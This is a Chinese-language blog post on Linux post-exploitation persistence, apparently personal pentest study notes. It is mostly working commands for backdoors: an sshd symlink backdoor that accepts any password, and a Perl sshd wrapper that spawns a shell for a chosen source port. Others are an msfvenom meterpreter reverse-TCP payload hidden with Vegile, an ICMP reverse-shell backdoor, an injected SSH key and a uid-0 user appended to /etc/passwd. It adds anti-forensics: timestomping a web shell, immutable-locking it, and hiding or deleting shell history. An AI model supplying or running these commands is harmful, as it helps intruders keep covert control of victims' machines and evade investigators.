---
title: Linux权限维持
date: 2021-05-25 21:40:55
categories: 渗透测试技巧
tags: 权限维持
---

#### 背景

学习了一下Linux的权限维持，对一些常规的linux权限维持技巧做一个简单的记录。

虽然手法老套，容易查杀，但在有些环境也许仍有用武之地。

<!--more-->

#### 权限维持

##### SSH软连接

将sshd软连接名设置为su，启动时会去PAM配置文件夹寻找相对应名称的配置信息，而su在pam_rootok只检测uid 0 即可认证成功，从而可以使用任意密码登录。

`ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=4444;`

![](https://cdn.laohuan.art/2021-05-04_14-48-07ssh%E8%BD%AF%E9%93%BE%E6%8E%A51.png)

可使用当前用户登录也可新建用户

`sudo useradd test -p test`

密码随便输入即可登录

![](https://cdn.laohuan.art/2021-05-04_14-51-33-ssh%E8%BD%AF%E9%93%BE%E6%8E%A53.png)

##### SSH Wrapper

```bash
cd /usr/sbin/
mv sshd ../bin/
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd #4A是13377的小端模式
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/ssh restart
```

![](https://cdn.laohuan.art/2021-05-08_16-29-15-wrappr-1.png)

无13377端口处于监听状态

![](https://cdn.laohuan.art/2021-05-08_16-31-40-wrappr-2.png)

攻击机执行如下命令

​	`socat STDIO TCP4:192.168.19.139:22,sourceport=13377`

![](https://cdn.laohuan.art/2021-05-08_16-32-24-wrappr-3.png)

想要修改端口，使用python

```python
import struct
buffer = struct.pack('>I6',6666)
print repr(buffer)
```

##### strace监听ssh来源流量

`ps -ef | grep sshd`  //父进程PID

![](https://cdn.laohuan.art/2021-05-10_21-03-36-strace.png)

`strace -f -p 2387 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048`

`grep "read(6" /tmp/.ssh.log | tail -n 10`

![](https://cdn.laohuan.art/2021-05-10_21-00-27-strace2.png)

##### 端口复用

`apt install sslh`

`sudo nano /etc/default/sslh`

将**Run=no**改为**Run=yes**，再修改其需要复用的端口

![](https://cdn.laohuan.art/2021-05-08_18-40-24-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.png)

直接ssh 443端口

![](https://cdn.laohuan.art/2021-05-08_18-43-40-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8.png)

在测试时发现443端口如果有服务监听时无法成功，可能是我环境问题。

##### vegile

[传送门](https://github.com/Screetsec/Vegile.git)

```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
```

帮助信息

![](https://cdn.laohuan.art/2021-05-10_21-46-59-vegile-h.png)

生成msf木马

`msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.19.146 LPORT=4444 -f elf > test.elf`

隐藏木马

`chmod +x test.elf`
`./Vegile --u test.elf`

![](https://cdn.laohuan.art/2021-05-10_22-00-14-vegile-t.png)

##### ICMP后门

[项目地址](https://github.com/andreafabrizi/prism)

安装

```bash
git clone https://github.com/andreafabrizi/prism.git
apt-get install libc6-dev-amd64
```

修改文件

`nano prism.c`

![](https://cdn.laohuan.art/2021-05-12_20-58-19-icmp-1.png)

编译

`gcc -DDETACH -m64 -Wall -s -o prism prism.c`

Nc 监听

`nc -lvp 6666`

执行反弹命令

`python sendPacket.py 192.168.19.139 test  192.168.19.146 6666`

![](https://cdn.laohuan.art/2021-05-12_20-59-32-icmp-2.png)

成功获取shell,python交互式shell

`python -c "import pty;pty.spawn('/bin/bash')"`

![](https://cdn.laohuan.art/2021-05-12_21-01-22-icmp-3.png)

##### SSH KEY

生成密钥对

​	`ssh-keygen -t rsa`

直接回车会在默认位置～/.ssh下生成密钥对，我这里生成test

![](https://cdn.laohuan.art/2021-05-13_21-01-17-sshkey1.png)

将公钥test.pub的内容放到目标的authorized_keys文件中

`echo test.pub >> ~/.ssh/authorized_keys`

设置权限

`chmod 600 ~/.ssh/authorized_keys`
`chmod 700 ~/.ssh`

![](https://cdn.laohuan.art/2021-05-13_21-01-56-sshkey2.png)

连接目标，**-i** 指定私钥

`ssh -i test root@192.168.19.139 `

![](https://cdn.laohuan.art/2021-05-13_21-02-32-sshkey3.png)

##### 其他命令

1. 创建root用户

   生成密码

   `perl -le 'print crypt("123456","haha")' `//密码:123456 盐值:haha

![](https://cdn.laohuan.art/2021-05-13_21-48-52-add_root1.png)

​	写入passwd

​	`echo "hacker:hazsR9UJJSGrk:0:0:root:/root:/bin/bash">>/etc/passwd`

2. 时间戳

   `touch -r index.php shell.php` //将shell.php的时间戳改为index.php的时间戳

3. 文件加锁

   `chattr +i shell.php`

   解锁

   `chattr -i shell.php`

4. history历史命令记录

   关闭历史命令记录

   `[空格]set +o history` //前面有空格，意味着此条命令也不会被记录

   

   删除历史命令

   `history -d num ` //num为要删除的命令序号

   

   恢复历史命令记录

   `set -o history`

#### 参考连接

[https://xz.aliyun.com/t/7338](https://xz.aliyun.com/t/7338)

[https://www.cnblogs.com/-mo-/p/12337766.html](https://www.cnblogs.com/-mo-/p/12337766.html)

